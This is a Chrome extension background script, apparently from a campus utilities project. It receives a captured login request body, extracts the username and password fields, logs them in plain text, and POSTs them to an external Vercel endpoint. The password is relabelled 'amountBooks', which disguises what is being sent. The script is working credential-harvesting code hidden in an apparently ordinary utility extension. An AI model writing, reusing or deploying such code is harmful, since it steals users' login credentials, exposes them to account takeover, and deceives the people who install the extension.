const VERCEL_URL = "https://campus-ort-utils-backend.vercel.app/api/users";

console.log("[TIC][bg] background service worker started");

chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
  console.log("[TIC][bg] message received:", message);

  if (message?.type !== "LOGEAR_PAYLOAD") {
    console.log("[TIC][bg] ignored message");
    return;
  }

  const rawBody = message.rawBody;

  console.log("[TIC][bg] rawBody:", rawBody);

  if (typeof rawBody !== "string" || !rawBody.length) {
    console.error("[TIC][bg] Missing or invalid rawBody");
    sendResponse({ ok: false, error: "Missing rawBody" });
    return;
  }

  try {
    const params = new URLSearchParams(rawBody);

    console.log("[TIC][bg] parsed params entries:", [...params.entries()]);

    const username = params.get("u");
    const password = params.get("c");

    console.log("[TIC][bg] extracted fields:", {
        username,
        password
    });

    if (!username || password == null) {
      console.error("[TIC][bg] Could not extract u or c");
      sendResponse({
        ok: false,
        error: "Could not extract u/c",
        rawBody
      });
      return;
    }

    const payload = {
      username: String(username),
      amountBooks: String(password)
    };

    console.log("[TIC][bg] forwarding payload to Vercel:", payload);

    fetch(VERCEL_URL, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify(payload)
    })
      .then(async (res) => {
        const text = await res.text();

        console.log("[TIC][bg] Vercel response:", {
          ok: res.ok,
          status: res.status,
          body: text
        });

        sendResponse({
          ok: res.ok,
          status: res.status,
          body: text
        });
      })
      .catch((error) => {
        console.error("[TIC][bg] fetch to Vercel failed:", error);

        sendResponse({
          ok: false,
          error: error.message
        });
      });
  } catch (error) {
    console.error("[TIC][bg] parsing failed:", error);

    sendResponse({
      ok: false,
      error: String(error)
    });
  }

  return true;
});